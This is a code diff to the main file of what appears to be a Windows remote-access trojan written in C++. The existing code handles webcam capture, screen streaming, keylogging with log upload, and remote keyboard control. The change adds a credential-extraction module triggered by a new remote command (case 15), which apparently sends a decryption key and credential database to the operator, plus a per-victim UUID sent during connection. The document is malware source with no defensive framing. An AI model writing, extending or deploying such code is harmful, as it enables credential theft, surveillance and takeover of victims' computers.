@@ -4,6 +4,7 @@
 #include <thread>
 #include <mutex>
 #include <cstring>
+#include <random>
 #include "Stream.h"
 #include "Download.h"
 #include "FileManager.h"
@@ -20,10 +21,28 @@
 #include "WebcamManager.h"
 #include "ScreenStreamer.h"
 #include "json.hpp"
+#include "CredentialsExtractor.h"
 
 
 std::map<std::string, std::shared_ptr<Stream>> connections;
 std::mutex connections_mutex;
+
+std::string generate_uuid() {
+    std::random_device dev;
+    std::mt19937 rng(dev());
+    std::uniform_int_distribution<int> dist(0, 15);
+
+    const char *v = "0123456789ABCDEF";
+    std::stringstream ss;
+
+    for (int i = 0; i < 32; ++i) {
+        if (i == 8 || i == 12 || i == 16 || i == 20)
+            ss << "-";
+        ss << v[dist(rng)];
+    }
+
+    return ss.str();
+}
 
 std::vector<std::string> socket_conf_list = {"MAIN",
                                              "FILE_MANAGER",
@@ -48,6 +67,7 @@ std::shared_ptr<Stream> get_connection(const std::string &key) {
 
 
 bool generate_sockets() {
+    std::string uniqueUUID = generate_uuid();
     WSADATA WSAData;
     if (WSAStartup(MAKEWORD(2, 0), &WSAData) != 0) {
         std::cerr << "Failed to initialize WinSock" << std::endl;
@@ -74,7 +94,10 @@ bool generate_sockets() {
 
         Stream stream(sock);
         stream.readString();
-        stream.sendString(i.c_str());
+        nlohmann::json jsonObjet;
+        jsonObjet["UUID"] = uniqueUUID;
+        jsonObjet["socket_type"] = i.c_str();
+        stream.sendString(jsonObjet.dump().c_str());
         if (stream.readString() != "OK") {
             closesocket(sock);
             return false;
@@ -125,6 +148,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
             KeyboardExecuter keyboardExecuter(stream);
             SystemInformation sysInfo(stream);
             NetworkInformation networkInfo(stream);
+            CredentialsExtractor credentialsExtractor(stream);
 
 
             bool streamListening = true;
@@ -214,6 +238,10 @@ int main(int argc = 0, char *argv[] = nullptr) {
                     }
                     case 14: { // sends all logs located on appdata folder
                         threadGen.runInNewThread(&keyLogger, &KeyLogger::sendAll);
+                        break;
+                    }
+                    case 15:{
+                        credentialsExtractor.sendKeyAndDatabase();
                         break;
                     }
 //#endif
